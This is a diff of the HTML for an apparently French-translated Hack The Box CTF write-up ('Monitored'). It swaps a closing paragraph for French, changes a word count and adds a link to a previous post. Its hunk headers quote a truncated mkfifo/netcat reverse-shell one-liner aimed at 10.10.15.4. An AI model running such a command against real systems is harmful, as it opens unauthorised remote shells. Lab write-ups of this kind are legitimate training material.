-<p>Monitored was a fun challenge forcing me to up my scanning and enumeration game, this was the first time I had to use a UDP scan for a CTF. I hope this write up was helpful! If you have any questions you can leave a comment (which requires a Github account) or you can reach out on Twitter at <a href="https://twitter.com/_KScorpio" target="_blank" >_KScorpio</a>
+<p>J&rsquo;espère que cet article vous a été utile! Si vous avez des questions, vous pouvez laisser un commentaire (nécessite un compte Github) ou vous pouvez me contacter sur Twitter à <a href="https://twitter.com/_KScorpio" target="_blank" >_KScorpio</a>
 
 .</p>
 
@@ -449,7 +445,7 @@ echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.4 555
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1474 Mots
+        1459 Mots
       </p>
 
       <p>
@@ -570,6 +566,13 @@ echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.4 555
         
 
         <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://scorpiosec.com/fr/posts/2024/05/htb-bizness/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">HTB Bizness</span>
+                </a>
+            </span>
             
 
             
